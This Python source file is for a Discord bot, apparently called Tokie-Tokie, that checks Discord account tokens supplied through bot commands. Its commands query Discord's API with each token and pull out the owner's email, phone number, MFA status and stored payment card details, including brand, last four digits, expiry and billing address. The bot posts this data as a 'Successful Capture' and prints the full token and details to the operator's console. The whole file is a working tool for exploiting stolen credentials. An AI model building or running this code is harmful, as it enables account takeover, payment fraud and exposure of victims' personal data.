# Made by DankoOfficial on Github
# Discord: $ky#3788
# Dont skid, I'll catch you I swear. Give credits
# uc = User Info
# vt = Valid Token
# hpm = Has Payment Method
import requests, discord;from discord.ext import commands;import webbrowser

def checkVersion():
    version = requests.get('https://raw.githubusercontent.com/DankoOfficial/Tokie-Tokie/main/Version.txt').text
    if version == "0.2\n":
        bot()
    else:
        print(f'Your version is out dated! The new version is: {version}')
        webbrowser.open('https://github.com/DankoOfficial/Tokie-Tokie', new=2)

def bot():
    client = commands.Bot(command_prefix=".")
    discordBot = 'YOUR BOT TOKEN HERE'
    @client.event
    async def on_ready():
        print(f"""Successfully Connected To [{client.user}]\n\n[!] Logs will be sent here""")
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f".help | Checking your Discord Tokens"))
    @client.command()
    async def ui(ctx, *, text):
        message = ctx.message;await message.delete()
        getUserInformation = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': text})
        if "avatar_decoration" in getUserInformation.text:
            id = getUserInformation.json()['id']
            username = getUserInformation.json()['username']
            discriminator = getUserInformation.json()['discriminator']
            avatar_decoration = getUserInformation.json()['avatar_decoration']
            flags = getUserInformation.json()['flags']
            banner = getUserInformation.json()['banner']
            nsfw_allowed = getUserInformation.json()['nsfw_allowed']
            mfa_enabled = getUserInformation.json()['mfa_enabled']
            email = getUserInformation.json()['email']
            verified = getUserInformation.json()['verified']
            phone = getUserInformation.json()['phone']
            capture = f"""
            :id: **User ID**: `{id}`
            :name_badge: **Username**: `{username}#{discriminator}`
            :ninja: **is Alt**: `{avatar_decoration}`
            :checkered_flag: **Flags**: `{flags}`
            :triangular_flag_on_post: **Has Banner**: `{banner}`
            :underage: **NSFW Allowed**: `{nsfw_allowed}`
            :lock: **MFA Enabeled**: `{mfa_enabled}`
            :incoming_envelope: **Email**: `{email}`
            :white_check_mark: **Verified**: `{verified}`
            :mobile_phone: **Phone**: `{phone}`
            """
            embedVar = discord.Embed(title="Successful Capture", description=" ", color=0x38d13b)
            embedVar.add_field(name="Capture", value=capture, inline=False)
            await ctx.send(embed=embedVar)
            print(f'[+] Account Token: {text} | ID: {id} | Username: {username}#{discriminator} | Flags: {flags} | MFA: {mfa_enabled} | Email: {email} | Verified: {verified} | Phone: {phone}')
        elif 'Unauthorized' in getUserInformation.text:
            embedVar = discord.Embed(title=":x: Invalid Token", description="", color=0xFF0000)
            replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            text = text.replace(text[len(text) - 15:], replacement)
            embedVar.add_field(name="Passed Token: ", value='```'+text+'```', inline=False)
            await ctx.send(embed=embedVar)

    @client.command()
    async def vt(ctx, *, text):
        message = ctx.message
        await message.delete()
        getUserInformation = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': text})
        if "avatar_decoration" in getUserInformation.text:
            embedVar = discord.Embed(title=":white_check_mark: Valid Token", description="",color=0x38d13b)
            replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            text = text.replace(text[len(text) - 15:], replacement)
            embedVar.add_field(name="Passed Token: ", value='```' + text + '```', inline=False)
            await ctx.send(embed=embedVar)
        elif 'Unauthorized' in getUserInformation.text:
            embedVar = discord.Embed(title=":x: Invalid Token", description="", color=0xFF0000)
            replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            text = text.replace(text[len(text) - 15:], replacement)
            embedVar.add_field(name="Passed Token: ", value='```'+text+'```', inline=False)
            await ctx.send(embed=embedVar)

    @client.command()
    async def hpm(ctx, *, text):
        message = ctx.message
        await message.delete()
        getUserInformation = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'authorization': text})
        print(getUserInformation.content.decode())
        if getUserInformation.text == "[]" :
            embedVar = discord.Embed(title=":white_check_mark: Valid Token", description="",color=0xFF0000)
            replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            text = text.replace(text[len(text) - 15:], replacement)
            embedVar.add_field(name="Passed Token: ", value='```' + text + '```', inline=False)
            embedVar.add_field(name=":credit_card: Payment Method", value='None', inline=False)
            await ctx.send(embed=embedVar)
        elif 'Unauthorized' in getUserInformation.text:
            print(getUserInformation.text)
            embedVar = discord.Embed(title=":x: Invalid Token", description="", color=0xFF0000)
            replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            text = text.replace(text[len(text) - 15:], replacement)
            embedVar.add_field(name="Passed Token: ", value='```'+text+'```', inline=False)
            await ctx.send(embed=embedVar)
        elif 'You need to verify your account in order to perform this action' in getUserInformation.text:
            embedVar = discord.Embed(title=":exclamation: Custom Token", description="", color=0xc27c0e)
            replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            text = text.replace(text[len(text) - 15:], replacement)
            embedVar.add_field(name="Passed Token: ", value='```' + text + '```', inline=False)
            message = getUserInformation.json()['message']
            embedVar.add_field(name="Error Message", value='```' + message + '```', inline=False)
            await ctx.send(embed=embedVar)
        else:
            if 'last_4' in getUserInformation.text:
                try:
                    brand = getUserInformation.json()[0]['brand']
                    last_4 = getUserInformation.json()[0]['last_4']
                    expires_month = getUserInformation.json()[0]['expires_month']
                    expires_year = getUserInformation.json()[0]['expires_year']
                    billingName = getUserInformation.json()[0]['billing_address']['name']
                    billingStreet = getUserInformation.json()[0]['billing_address']['line_1']
                    billingCountry = getUserInformation.json()[0]['billing_address']['country']
                    capture = f"""
                    :moneybag: **Brand:** `{brand.title()} [{last_4}]`
                    :date: **Expiry:** `{expires_month}/{expires_year}`
                    :motorway: **Billing:** `[{billingName.title()}] - {billingStreet.title()} ({billingCountry.title()})`"""
                    replacement = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
                    text = text.replace(text[len(text) - 15:], replacement)
                    embedVar = discord.Embed(title=":white_check_mark: Valid Token", description="", color=0xFF0000)
                    embedVar.add_field(name="Passed Token: ", value='```' + text + '```', inline=False)
                    embedVar.add_field(name=":credit_card: Payment Method\n",value=capture, inline=False)
                    embedVar.add_field(name=":credit_card: Payment Method in JSON", value=f"```js\n{getUserInformation.json()[0]}```", inline=False)
                    await ctx.send(embed=embedVar)
                except:
                    embedVar = discord.Embed(title=":white_check_mark: Valid Token", description="", color=0xc27c0e)
                    embedVar.add_field(name="",value="Failed to get Payment Method info", inline=False)
                    embedVar.add_field(name=":credit_card: Payment Method in JSON",value=f"```js\n{getUserInformation.json()[0]}```", inline=False)
    client.run(discordBot)

checkVersion()